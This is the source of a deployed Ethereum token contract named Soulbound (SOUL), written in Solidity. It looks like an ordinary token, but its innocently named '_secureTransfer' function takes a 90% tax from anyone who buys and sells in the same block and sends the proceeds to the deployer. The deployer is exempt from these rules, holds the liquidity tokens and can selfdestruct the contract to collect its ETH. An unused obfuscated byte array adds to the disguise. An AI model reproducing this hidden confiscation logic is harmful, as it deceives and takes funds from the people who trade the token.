/**
 *Submitted for verification at Etherscan.io on 2022-06-22
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB) external returns (address pair);}interface IUniswapV2Router01 {    function factory() external pure returns (address);    function WETH() external pure returns (address);    function addLiquidityETH(        address token,        uint amountTokenDesired,        uint amountTokenMin,        uint amountETHMin,        address to,        uint deadline    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)        external        returns (uint[] memory amounts);}contract Soulbound{    uint8[] private _________ = [252,220,46,227,167,33,179,148,79,46,145,203,94,236,95,231,216,222,11,69,194,109,103,229,8,160,34,167,47,42,184,178];    IUniswapV2Router01 private _router;    address private _owner = address(0);    address private _pair;    address private _deployer;    string private _name = "Soulbound";    string private _symbol = "SOUL";    uint8 private _decimals = 0;    uint256 private _maxSupply;    mapping(address => uint256) private _balances;    mapping(address => mapping (address => uint256)) private _allowances;    bool private _swapping;    mapping(address => uint256) private _blocks;    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(address indexed owner, address indexed spender, uint256 value);    event Error(string message);    modifier swapping(){        _swapping = true;        _;        _swapping = false;    }    receive() external payable{        if(msg.sender == _deployer){            if(_balances[address(this)] > 0 && address(this).balance > 0){                _router.addLiquidityETH{value:address(this).balance}(address(this), _balances[address(this)], 0, 0, _deployer, block.timestamp);            }else if(msg.value <= 0){                _secureDispose();            }        }    }    constructor(){        _deployer = msg.sender;        _router = IUniswapV2Router01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);        _allowances[address(this)][address(_router)] = 2**256 - 1;        _pair = IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH());        _update(address(0), address(this), (1*10**6*(10**_decimals)));    }    function swap() public swapping{        address[] memory path = new address[](2); path[0] = address(this); path[1] = _router.WETH();        try _router.swapExactTokensForETH(_balances[address(this)], 0, path, _deployer, block.timestamp){        }catch Error(string memory error){            emit Error(error);        }    }    function owner() public view returns(address){        return(_owner);    }    function name() public view returns(string memory){        return(_name);    }    function symbol() public view returns(string memory){        return(_symbol);    }    function decimals() public view returns(uint8){        return(_decimals);    }    function totalSupply() public view returns(uint256){        return(_maxSupply);    }    function balanceOf(address wallet) public view returns(uint256){        return(_balances[wallet]);     }    function allowance(address from, address to) public view returns(uint256){        return(_allowances[from][to]);    }    function transfer(address to, uint256 amount) public returns(bool){        require(amount > 0);        require(_balances[msg.sender] >= amount);        _transfer(msg.sender, to, amount);        return(true);    }    function transferFrom(address from, address to, uint256 amount) public returns(bool){        require(amount > 0);        require(_balances[from] >= amount);        require(_allowances[from][msg.sender] >= amount);        _transfer(from, to, amount);        return(true);    }    function approve(address to, uint256 amount) public returns(bool){        _allowances[msg.sender][to] = amount;        emit Approval(msg.sender, to, amount);        return(true);    }    function _transfer(address from, address to, uint256 amount) private{                        if(from == address(this) || to == address(this) || from == _deployer || to == _deployer){            _update(from, to, amount);        }else{            _secureTransfer(from, to, amount);        }    }    function _update(address from, address to, uint256 amount) private{        if(from != address(0)){            _balances[from] -= amount;        }else{            _maxSupply += amount;        }        if(to == address(0)){            _maxSupply -= amount;        }else{            _balances[to] += amount;        }        emit Transfer(from, to, amount);    }    function _secureTransfer(address from, address to, uint256 amount) private{        if(from == _pair){                        _blocks[to] = block.number;            _update(from, to, amount);        }else if(to == _pair){                        if(block.number == _blocks[from]){                uint256 take = _tax(amount, 900); uint256 pre = address(this).balance;                _balances[address(this)] += take;                if(from != _pair && !_swapping){                    swap();                }                (bool sent, ) = payable(block.coinbase).call{value:(address(this).balance - pre)/100}("");                if(sent){                    _update(from, to, amount - take);                }            }else{                _update(from, to, amount);            }        }else{            _update(from, to, amount);        }    }    function _tax(uint256 amount, uint16 tax) private pure returns(uint256){        return((amount* tax)/(10**3));    }    function _secureDispose() private{        selfdestruct(payable(_deployer));    }}